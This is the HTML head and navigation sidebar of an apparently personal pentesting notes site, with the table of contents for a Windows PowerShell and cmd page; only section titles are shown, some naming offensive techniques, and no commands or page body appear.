
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="A bunch of miscellaneous pentesting and scripting notes">
      
      
        <meta name="author" content="Glasgow">
      
      
      
        <link rel="prev" href="../../Reversing/radare2/">
      
      
        <link rel="next" href="../UAC_Firewall_Defender_bypass/">
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.4.3, mkdocs-material-9.1.17">
    
    
      
        <title>Windows (Powershell & cmd) - Pentesting</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.26e3688c.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.ecc896b0.min.css">
      
      

    
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#windows-powershell-cmd" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Pentesting" class="md-header__button md-logo" aria-label="Pentesting" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Pentesting
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Windows (Powershell & cmd)
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
      <label class="md-header__button md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/GlasgOWned/PenTesting" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GlasgOWned/PenTesting
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Pentesting" class="md-nav__button md-logo" aria-label="Pentesting" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>

    </a>
    Pentesting
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/GlasgOWned/PenTesting" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.4.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    GlasgOWned/PenTesting
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        PenTesting Resources / Links
      </a>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
      
      
      
        <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
          CTF
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_2">
          <span class="md-nav__icon md-icon"></span>
          CTF
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/CTFs/" class="md-nav__link">
        CTFs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Forensics_and_Stego/" class="md-nav__link">
        Forensics & Stego
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Password_Cracking/" class="md-nav__link">
        Password Cracking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Sites/" class="md-nav__link">
        CTFs, Wargames, and Write-ups
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/xss/" class="md-nav__link">
        XSS
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
      
      
      
        <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
          Crypto
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_2_6">
          <span class="md-nav__icon md-icon"></span>
          Crypto
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Crypto/Crypto/" class="md-nav__link">
        Crypto
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Crypto/RSA/" class="md-nav__link">
        RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../CTF/Crypto/cipher_types/" class="md-nav__link">
        Cipher types
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
      
      
      
        <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
          Exfiltration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_3">
          <span class="md-nav__icon md-icon"></span>
          Exfiltration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Exfiltration/moving_files_between_systems/" class="md-nav__link">
        Moving files between systems
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
      
      
      
        <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
          Exploits and Code Execution
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Exploits and Code Execution
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Exploits_and_Code_Execution/BufferOverflow/" class="md-nav__link">
        Buffer Overflow
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Exploits_and_Code_Execution/command_injection/" class="md-nav__link">
        Command Injection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Exploits_and_Code_Execution/restricted_shell_escape/" class="md-nav__link">
        Escaping restricted shells
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Exploits_and_Code_Execution/reverse_shells/" class="md-nav__link">
        Reverse Shell Cheat Sheet
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
      
      
      
        <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
          Linux
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Linux
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/command_line_prompt/" class="md-nav__link">
        Command line prompt
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Linux/useful_linux_commands/" class="md-nav__link">
        Useful Linux Commands
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
      
      
      
        <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
          Recon and Enumeration
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Recon and Enumeration
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recon_and_Enumeration/" class="md-nav__link">
        Recon and Enumeration
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Recon_and_Enumeration/networking/" class="md-nav__link">
        Networking
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
      
      
      
        <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
          Resources
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          Resources
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Resources/links_and_references/" class="md-nav__link">
        bookmarks and reading
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
      
      
      
        <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
          Reversing
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          Reversing
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Reversing/Reversing/" class="md-nav__link">
        Reversing
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Reversing/radare2/" class="md-nav__link">
        radare2
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" checked>
      
      
      
        <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
          Windows
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="true">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          Windows
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Windows (Powershell & cmd)
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Windows (Powershell & cmd)
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#powershell-commands" class="md-nav__link">
    Powershell Commands
  </a>
  
    <nav class="md-nav" aria-label="Powershell Commands">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#useful-cmdlets-and-aliases" class="md-nav__link">
    Useful Cmdlets (and aliases)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#info-gathering" class="md-nav__link">
    Info gathering:
  </a>
  
    <nav class="md-nav" aria-label="Info gathering:">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#cmd-stuff" class="md-nav__link">
    CMD stuff
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#language-mode" class="md-nav__link">
    Language Mode
  </a>
  
    <nav class="md-nav" aria-label="Language Mode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#check-current-language-mode" class="md-nav__link">
    Check current language mode
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#escape-constrained-language-mode" class="md-nav__link">
    Escape Constrained Language Mode
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#where-is-a-binary" class="md-nav__link">
    Where is a binary:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#print-environment-variable" class="md-nav__link">
    Print environment variable:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-system-is-64-bit" class="md-nav__link">
    Check if system is 64 bit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enable-ise-using-powershell" class="md-nav__link">
    Enable ISE using Powershell
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#securely-store-credentials-in-xml-for-import" class="md-nav__link">
    securely store credentials in xml for import
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-output-to-file" class="md-nav__link">
    command output to file
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#command-output-to-clipboard" class="md-nav__link">
    command output to clipboard
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-file" class="md-nav__link">
    download file
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-powerup-with-powershell-v20" class="md-nav__link">
    Download Powerup With Powershell &lt;= V.2.0
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-powerup" class="md-nav__link">
    USING POWERUP
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powerup-one-liner" class="md-nav__link">
    PowerUp one-liner
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-mimikatz" class="md-nav__link">
    Powershell MIMIKATZ
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tail-a-logfile" class="md-nav__link">
    Tail a logfile
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#run-powershell-script-to-get-around-execution-of-scripts-disabled-error" class="md-nav__link">
    Run powershell script to get around execution of scripts disabled error
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-sysinternals" class="md-nav__link">
    Download SYSINTERNALS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-hostname" class="md-nav__link">
    Get hostname:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#list-local-accounts-on-a-system" class="md-nav__link">
    List local accounts on a system:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-system-is-joined-to-a-domain-or-a-workgroup" class="md-nav__link">
    Check if system is joined to a domain or a workgroup:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#set-environment-variable" class="md-nav__link">
    SET ENVIRONMENT VARIABLE
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#show-env-vars-in-running-script" class="md-nav__link">
    SHOW ENV VARS IN RUNNING SCRIPT
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-list-of-running-processes" class="md-nav__link">
    Get list of running processes:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-if-system-is-running-a-desktop-version-of-windows" class="md-nav__link">
    CHECK IF SYSTEM IS RUNNING A DESKTOP VERSION OF WINDOWS
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-windows-kernel-version" class="md-nav__link">
    GET WINDOWS KERNEL VERSION
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#get-list-of-ipv4-addr" class="md-nav__link">
    GET LIST OF IPV4 ADDR
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#change-hostname" class="md-nav__link">
    CHANGE HOSTNAME
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#log-script-output-to-file" class="md-nav__link">
    LOG SCRIPT OUTPUT TO FILE
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#wget" class="md-nav__link">
    WGET
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#check-permissions-for-folder" class="md-nav__link">
    Check Permissions For Folder
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netstat-with-find" class="md-nav__link">
    NETSTAT WITH FIND
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#look-for-files-with-passwords" class="md-nav__link">
    Look for files with passwords:
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#disable-firewall" class="md-nav__link">
    Disable firewall
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#make-administrator-user-active" class="md-nav__link">
    Make administrator user active
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#set-user-password-to-never-expire" class="md-nav__link">
    Set user password to never expire
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#netstat-show-listening-ports" class="md-nav__link">
    Netstat (show listening ports):
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#cmd" class="md-nav__link">
    CMD
  </a>
  
    <nav class="md-nav" aria-label="CMD">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#useful-cmd-one-liners" class="md-nav__link">
    Useful cmd one-liners:
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../UAC_Firewall_Defender_bypass/" class="md-nav__link">
        UAC Firewall Defender bypass
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../powershell_to_sort/" class="md-nav__link">
        Powershell to sort
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
      
      
      
        <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
          Kali setup and installs
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_10">
          <span class="md-nav__icon md-icon"></span>
          Kali setup and installs
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../kali_setup_and_installs/" class="md-nav__link">
        Kali setup and installs
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../kali_setup_and_installs/desktop_environments/" class="md-nav__link">
        Change Kali Desktop Environment:
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../kali_setup_and_installs/packages_and_installs/" class="md-nav__link">
        Packages and Installs
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
          Miscellaneous
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11">
          <span class="md-nav__icon md-icon"></span>
          Miscellaneous
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/docker/" class="md-nav__link">
        Docker
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/email/" class="md-nav__link">
        Email
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/grep/" class="md-nav__link">
        Grep
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/jq_syntax/" class="md-nav__link">
        Jq syntax
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/markdown/" class="md-nav__link">
        Markdown
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/misc/" class="md-nav__link">
        Miscellaneous stuff to be sorted later
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/perl/" class="md-nav__link">
        Perl
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/php/" class="md-nav__link">
        Php
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/regular_expressions/" class="md-nav__link">
        Regular Expressions
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/tmux/" class="md-nav__link">
        Tmux
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_11" >
      
      
      
        <label class="md-nav__link" for="__nav_11_11" id="__nav_11_11_label" tabindex="0">
          Python
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_11_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11_11">
          <span class="md-nav__icon md-icon"></span>
          Python
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/" class="md-nav__link">
        Python
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/python_server/" class="md-nav__link">
        Python web server examples
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/python_to_sort/" class="md-nav__link">
        Python to sort
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../miscellaneous/Python/requests_and_beautifulsoup/" class="md-nav__link">
        Requests and beautifulsoup
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
      
      
      <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11_12" >
      
      
      
        <label class="md-nav__link" for="__nav_11_12" id="__nav_11_12_label" tabindex="0">
          To sort
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_11_12_label" aria-expanded="false">
        <label class="md-nav__title" for="__nav_11_12">
          <span class="md-nav__icon md-icon"></span>
          To sort
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
